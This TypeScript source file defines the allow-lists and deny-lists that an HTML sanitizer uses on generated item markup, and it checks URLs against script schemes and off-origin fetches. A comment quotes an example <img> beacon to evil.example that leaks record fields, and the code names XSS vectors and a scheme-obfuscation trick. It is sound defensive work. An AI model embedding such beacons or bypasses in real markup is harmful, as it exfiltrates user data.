// The closed allow-list the runtime enforcer keys on — the *data* half of the
// closed-value design contract. It mirrors the
// vocabulary whose single source of truth is
// design/design-system.md (classes) and design/styles/layout-kit.css (their CSS). The
// enforcer (enforcer.ts) and the design-lint gate rung (3.6) both key on these sets;
// vocabulary.test.ts cross-checks ALLOWED_CLASSES against the layout kit so the two
// can never silently drift.
//
// *Closed values, open composition.* The closed thing is the design-value space (the
// classes/tokens) and the executable surface (which elements/attributes may appear),
// never how an item arranges one record's own fields.

/**
 * The closed set of semantic/primitive classes generated item markup may use. Any
 * `class` token outside this set is fabricated and gets dropped. Kept in the exact
 * lowercase form the CSS authored — class names are case-sensitive, so a mismatched
 * casing would not resolve against the layout kit anyway.
 */
export const ALLOWED_CLASSES: ReadonlySet<string> = new Set([
  // Intra-item composition
  "stack",
  "cluster",
  // Layout — display / direction
  "flex",
  "grid",
  "flex-col",
  "flex-wrap",
  // Layout — alignment
  "items-start",
  "items-center",
  "items-end",
  "items-baseline",
  "justify-start",
  "justify-center",
  "justify-between",
  "justify-end",
  // Layout — gap (maps 1:1 onto the spacing tokens)
  "gap-0_5",
  "gap-1",
  "gap-2",
  "gap-3",
  // Layout — grid tracks / sizing
  "grid-cols-2",
  "grid-cols-3",
  "grow",
  "w-full",
  // Type scale + emphasis
  "text-xs",
  "text-sm",
  "text-lg",
  "text-xl",
  "text-bold",
  "text-muted",
  "text-subtle",
  // Truncation
  "truncate",
  "line-clamp-2",
  "line-clamp-3",
  // Media frame
  "media-frame",
  "media-frame--square",
  "media-frame--wide",
]);

/**
 * Presentational, non-interactive, same-namespace elements generated item markup may
 * use. An allowed element is kept and its attributes are cleaned; anything not here is
 * either removed with its content (REMOVED_ELEMENTS) or unwrapped (everything else —
 * interactive controls, `<html>`/`<body>` framing, and unknown/custom elements — so
 * their inner record text survives while the tag and its handlers do not).
 *
 * `<hr>` is absent, and it is the one absence the style rules cannot explain. Every
 * other boundary a record could draw is a CSS declaration, and `border` is never
 * declared — but a bare `<hr>` needs no declaration at all: the user agent draws it as
 * an inset 1px rule, so a property-keyed ban cannot see it. It is a boundary, the ink
 * system owns every boundary, and unwrapping it leaves nothing behind, since it has no
 * content. A record separates with a fill, a size or a gap instead.
 */
export const ALLOWED_ELEMENTS: ReadonlySet<string> = new Set([
  // Flow containers + blocks
  "div",
  "span",
  "p",
  "section",
  "article",
  "header",
  "footer",
  "aside",
  "figure",
  "figcaption",
  "hgroup",
  "address",
  "blockquote",
  "pre",
  "br",
  // Headings
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
  // Lists
  "ul",
  "ol",
  "li",
  "dl",
  "dt",
  "dd",
  // Inline text semantics
  "strong",
  "em",
  "b",
  "i",
  "u",
  "s",
  "small",
  "mark",
  "sub",
  "sup",
  "abbr",
  "time",
  "code",
  "kbd",
  "samp",
  "var",
  "q",
  "cite",
  "wbr",
  "bdi",
  "bdo",
  "data",
  "ins",
  "del",
  "ruby",
  "rt",
  "rp",
  // Media (the .media-frame surface + companions)
  "img",
  "picture",
  "source",
  "video",
  "audio",
  "track",
  // Tables
  "table",
  "caption",
  "colgroup",
  "col",
  "thead",
  "tbody",
  "tfoot",
  "tr",
  "td",
  "th",
]);

/**
 * Elements dropped *with their content* — their content is code, raw non-HTML text, or
 * a foreign/embedding context, never record data worth keeping. Scripts and styles are
 * the executable-surface bans; `<svg>`/`<math>`/`<template>`/raw-text elements are the
 * classic mutation-XSS vectors, so they leave with everything inside them.
 */
export const REMOVED_ELEMENTS: ReadonlySet<string> = new Set([
  "script",
  "style",
  "template",
  "textarea",
  "noscript",
  "noframes",
  "noembed",
  "iframe",
  "object",
  "embed",
  "param",
  "applet",
  "frame",
  "frameset",
  "base",
  "meta",
  "link",
  "title",
  "head",
  "svg",
  "math",
  "canvas",
  "xmp",
  "plaintext",
  "listing",
  "slot",
  "portal",
]);

/**
 * Attributes safe on any allowed element (plus most `aria-*`, handled in `isSafeAttr`).
 *
 * `role` is absent, and it is the one absence worth explaining. A record *is* a
 * `<button>` — the platform's item wrapper — and opening it is the only thing it does, so
 * the semantics of the whole item are the platform's and there is nothing left inside for a
 * record to declare a role for. What a `role` could do is make the item lie: `role="button"`
 * nests an ARIA button inside the real one, and `role="link"` announces a destination that
 * does not exist.
 */
const GLOBAL_SAFE_ATTRS: ReadonlySet<string> = new Set([
  "title",
  "lang",
  "dir",
  "translate",
  "hidden",
]);

/**
 * The one `aria-*` attribute a record may not carry. Every other one describes the content
 * to a reader; this one takes it away — a record could hide its own text from assistive
 * technology while showing it on screen, which is the one thing the item wrapper's
 * accessible name cannot make up for.
 */
const REMOVED_ARIA_ATTRS: ReadonlySet<string> = new Set(["aria-hidden"]);

/**
 * Per-element attribute allow-list. Everything not listed here (and not global/`aria-*`,
 * `class`, or `style`) is dropped by default-deny — which is what neutralizes every
 * `on*=` handler, `href`, `srcdoc`, `id`/`name` (DOM-clobbering), `data-*`, `is=`, and
 * so on without having to enumerate them.
 */
const ELEMENT_ATTRS: Readonly<Record<string, ReadonlySet<string>>> = {
  img: new Set(["src", "srcset", "sizes", "alt", "width", "height", "loading", "decoding"]),
  source: new Set(["src", "srcset", "sizes", "type", "media", "width", "height"]),
  // `controls` is the one media attribute the item wrapper cannot honour. A record is a
  // `<button>` and opening it is the only thing it does, so a transport control inside one
  // is unreachable — the press lands on the record — and interactive content inside a
  // button is not valid markup either. A record shows media; it does not play it back.
  video: new Set([
    "src",
    "poster",
    "width",
    "height",
    "muted",
    "loop",
    "autoplay",
    "playsinline",
    "preload",
  ]),
  audio: new Set(["src", "muted", "loop", "autoplay", "preload"]),
  track: new Set(["src", "kind", "srclang", "label", "default"]),
  time: new Set(["datetime"]),
  data: new Set(["value"]),
  ol: new Set(["start", "reversed", "type"]),
  li: new Set(["value"]),
  td: new Set(["colspan", "rowspan", "headers"]),
  th: new Set(["colspan", "rowspan", "headers", "scope", "abbr"]),
  col: new Set(["span"]),
  colgroup: new Set(["span"]),
  blockquote: new Set(["cite"]),
  q: new Set(["cite"]),
  ins: new Set(["datetime", "cite"]),
  del: new Set(["datetime", "cite"]),
  bdo: new Set(["dir"]),
};

/** URL-bearing attributes whose value is scheme-checked before it is kept. */
export const URL_ATTRS: ReadonlySet<string> = new Set(["src", "srcset", "poster", "cite"]);

/** Whether `name` is a keepable attribute on an allowed `tag` (lowercased inputs). */
export function isSafeAttr(tag: string, name: string): boolean {
  if (GLOBAL_SAFE_ATTRS.has(name)) return true;
  if (name.startsWith("aria-")) return !REMOVED_ARIA_ATTRS.has(name);
  return ELEMENT_ATTRS[tag]?.has(name) ?? false;
}

/**
 * Whether a URL-attribute value carries a script-executing or HTML-smuggling scheme.
 * C0 control characters and whitespace are stripped first so `java\tscript:` cannot
 * slip through; inline `data:image/*` stays allowed (legitimate for an image field),
 * while every other `data:` payload and the script schemes are rejected.
 *
 * This is the *scheme* half alone, and it is what the Handler-fragment scrub uses — a
 * Handler composes the capability's own chrome and may legitimately point at an address.
 * Item markup takes the stricter {@link isOffOriginUrl} below.
 */
export function isDangerousUrl(value: string): boolean {
  return urlCandidates(value).some(isDangerousUrlCandidate);
}

/**
 * Whether a URL-attribute value in *item markup* is off-limits: a dangerous scheme, or any
 * address that would make the browser fetch from somewhere else.
 *
 * A record may not reach off this origin. The `url(...)` ban in `style-discipline.ts` exists
 * for exactly this reason — it loads a remote resource — and leaving `<img src>` open made
 * that ban half a rule: a renderer emitting
 * `<img src="https://evil.example/px.gif?d=…record fields…" width="1">` passed the
 * design-lint rung clean and survived the enforcer byte-identically, exfiltrating every
 * rendered record. The two surfaces could not both be right.
 *
 * What stays allowed is what a record legitimately holds: an inline `data:image/*`, and a
 * same-origin path. A scheme of any kind and a protocol-relative `//host/…` are refused.
 */
export function isOffOriginUrl(value: string): boolean {
  return urlCandidates(value).some(
    (candidate) => isDangerousUrlCandidate(candidate) || isRemoteCandidate(candidate),
  );
}

/**
 * The addresses one attribute value names. `srcset` carries a comma-separated candidate
 * list with density/width descriptors, so a check that read the whole value as one URL
 * would see neither of the two addresses in `a.png 1x, https://evil.example/b.png 2x`.
 */
function urlCandidates(value: string): string[] {
  const stripped = stripControls(value);
  if (!stripped.includes(",")) return [stripped];
  return stripped
    .split(",")
    .map((part) => part.trim().split(/\s+/, 1)[0] ?? "")
    .filter((part) => part.length > 0);
}

/** Drop C0 controls and spaces, so `java\tscript:` reads as what a browser will read. */
function stripControls(value: string): string {
  let stripped = "";
  for (const ch of value) {
    if (ch.charCodeAt(0) > 0x20) stripped += ch;
  }
  return stripped;
}

function isDangerousUrlCandidate(candidate: string): boolean {
  const v = candidate.toLowerCase();
  if (v.includes("javascript:") || v.includes("vbscript:")) return true;
  return v.startsWith("data:") && !v.startsWith("data:image/");
}

/** A scheme of any kind, or a protocol-relative authority — both leave this origin. */
function isRemoteCandidate(candidate: string): boolean {
  const v = candidate.toLowerCase();
  if (v.startsWith("data:image/")) return false;
  if (v.startsWith("//")) return true;
  return /^[a-z][a-z0-9+.-]*:/.test(v);
}
